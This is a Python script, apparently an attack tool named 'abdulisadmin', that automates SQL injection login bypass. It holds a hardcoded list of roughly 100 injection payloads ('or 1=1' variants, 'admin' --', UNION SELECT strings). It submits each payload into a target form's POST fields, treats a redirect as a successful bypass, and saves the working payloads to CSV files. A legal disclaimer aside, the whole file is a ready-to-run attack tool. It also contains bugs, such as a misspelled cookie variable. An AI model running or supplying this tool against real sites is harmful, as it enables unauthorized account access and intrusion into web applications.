import requests
from urllib.parse import urlparse
import csv
import os
import sys
import argparse

print("    _    _         _       _ ___        _       _           _       ")
print("   / \  | |__   __| |_   _| |_ _|___   / \   __| |_ __ ___ (_)_ __  ")
print("  / _ \ | '_ \ / _` | | | | || |/ __| / _ \ / _` | '_ ` _ \| | '_ \ ")
print(" / ___ \| |_) | (_| | |_| | || |\__ \/ ___ \ (_| | | | | | | | | | |")
print("/_/   \_\_.__/ \__,_|\__,_|_|___|___/_/   \_\__,_|_| |_| |_|_|_| |_|")
print("v 1.0.1")
print("[!] legal disclaimer: Usage of abdulisadmin for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program \n")

#Define Payloads
payloads=["') or true--", "') or ('')=('", "') or 1--", "') or ('x')=('", '" or true--', '" or ""="', '" or 1--', '" or "x"="', '") or true--', '") or ("")=("', '") or 1--', '") or ("x")=("', "')) or true--", "')) or ((''))=(('", "')) or 1--", "')) or (('x'))=(('", '', "'-'", "' '", "'&'", "'^'", "'*'", "' or ''-'", "' or '' '", "' or ''&'", "' or ''^'", "' or ''*'", '"-"', '" "', '"&"', '"^"', '"*"', '" or ""-"', '" or "" "', '" or ""&"', '" or ""^"', '" or ""*"', 'or true--', '" or true--', "' or true--", '") or true--', "') or true--", "' or 'x'='x", "') or ('x')=('x", "')) or (('x'))=(('x", '" or "x"="x', '") or ("x")=("x', '")) or (("x"))=(("x', 'or 1=1', 'or 1=1--', "'or 1=1", "'or 1=1--", 'or 1=1#', 'or 1=1/*', 'or 1=1 -- -', "'or 1=1#", "'or 1=1/*", "'or 1=1 -- -", "admin' --", "admin' #", "admin'/*", "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*", "admin'or 1=1 or ''='", "admin' or 1=1", "admin' or 1=1--", "admin' or 1=1#", "admin' or 1=1/*", "admin') or ('1'='1", "admin') or ('1'='1'--", "admin') or ('1'='1'#", "admin') or ('1'='1'/*", "admin') or '1'='1", "admin') or '1'='1'--", "admin') or '1'='1'#", "admin') or '1'='1'/*", "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055", 'admin" --', 'admin" #', 'admin"/*', 'admin" or "1"="1', 'admin" or "1"="1"--', 'admin" or "1"="1"#', 'admin" or "1"="1"/*', 'admin"or 1=1 or ""="', 'admin" or 1=1', 'admin" or 1=1--', 'admin" or 1=1#', 'admin" or 1=1/*', 'admin") or ("1"="1', 'admin") or ("1"="1"--', 'admin") or ("1"="1"#', 'admin") or ("1"="1"/*', 'admin") or "1"="1', 'admin") or "1"="1"--', 'admin") or "1"="1"#', 'admin") or "1"="1"/*', '1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055',"admin"]

#Accept as Arguments
parser = argparse.ArgumentParser()
parser.add_argument("-u")
parser.add_argument("-data")
parser.add_argument("-cookies")
args = parser.parse_args()
url = args.u
path = urlparse(url).path
coreurl=urlparse(url).netloc
data=args.data
if url != None:
    if (data==None):
        print("No POST Data Provided, Exiting...")
        sys.exit()
    else:
        str = data
        d = dict(x.split("=") for x in str.split("&"))
        keys = list(d.keys())
    cookies=args.cookies
    if (cookies==None):
        postcookies={"AbdulAdmin":"Hacker 22385"}
    else:
        str = cookies
        postcookies = dict(x.split("=") for x in str.split(";"))
        

if url == None:
    #Accept URL
    url=input("Enter URL: ")
    path = urlparse(url).path
    coreurl=urlparse(url).netloc
    parsed = urlparse(url)
    scheme = "%s://" % parsed.scheme
    noschemeurl=parsed.geturl().replace(scheme, '', 1)
    #Accept POST Data
    data=input("Enter POST Data: ")
    if (data==None):
        print("No POST Data Provided, Exiting...")
        sys.exit()
    else:
        str = data
        d = dict(x.split("=") for x in str.split("&"))
        keys = list(d.keys())
    #Accept Cookies
    cookies=input("Enter Enter Cookies (leave blank if none): ")
    if (cookies==None):
       postcookies={"AbdulAdmin":"Hacker 22385"}
    else:
        str = cookies
        posttcookies = dict(x.split("=") for x in str.split(";"))
        







#Define Vuln and Non Vuln list and counters
nonvulnerable_list={}
nvcount=0
vulnerable_list={}
vcount=0

#Print Info
print("Starting Attack")
print("Target URL: "+f'{url}')

#Main Request Body
for x in range(len(payloads)):

    
    
    session = requests.session()

    session.encoding = 'utf-8'

    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": url, "Connection": "close", "Referer": url, "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
    

    
    d[keys[0]] = payloads[x]
    d[keys[1]]=payloads[x]
    postdata=d
    try:
        response=session.post(url, headers=headers, cookies=postcookies, data=postdata)
    except:
        print("Enter URL With scheme i.e http://"+f'{url}'+" or https://"+f'{url}')
        sys.exit()
    op_url=(response.url)
    op_path=urlparse(op_url).path
    
    if op_path==path:
        nvcount = nvcount+1
        nonvulnerable_list.__setitem__(payloads[x],op_url)
        
        
    else:
        vcount = vcount+1
        vulnerable_list.__setitem__(payloads[x],op_url)
    loading=(x/101)*100
    print("Testing Payloads..."+f'{loading}'+"% Completed",end="\r")    

print("Testing Payloads... 100% Completed")
#Create Target folder
current_directory = os.getcwd()
final_directory = os.path.join(current_directory, r'%s'%coreurl)
if not os.path.exists(final_directory):
   os.makedirs(final_directory)


#Write Txt for Information
save_path = os.path.join(current_directory, r'%s'%coreurl)
completeName = os.path.join(save_path, "Targetinfo.txt") 
lines = ['Base Url: '+url, 'Post Data: '+data,'Cookies: '+f'{cookies}']
with open(completeName, 'w') as f:
    for line in lines:
        f.write(line)
        f.write('\n')

#Write Exploitable Payloads
save_path = os.path.join(current_directory, r'%s'%coreurl)
completeName = os.path.join(save_path, "vuln.csv") 
with open(completeName, 'w', newline='') as csvfile:
    fieldnames = ["Payload", "Redirected URL"]
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
    writer.writeheader()
    for key in vulnerable_list:
        writer.writerow({'Payload': key, 'Redirected URL': vulnerable_list[key]})
print(" Vulnerable using " + f'{vcount}' +" number of Payloads")
print(" Exploitable Payloads dumped in Vuln.csv file")

#Write Non Vulnerable Parameters
save_path = os.path.join(current_directory, r'%s'%coreurl)
completeName = os.path.join(save_path, "nonvuln.csv")
with open(completeName, 'w', newline='') as csvfile:
    fieldnames = ["Payload", "Redirected URL"]
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
    writer.writeheader()
    for key in nonvulnerable_list:
        writer.writerow({'Payload': key, 'Redirected URL': nonvulnerable_list[key]})
print("Not Vulnerable using " + f'{nvcount}' +" number of Payloads")
print(" Non Exploitable Payloads dumped in nonvuln.csv file")
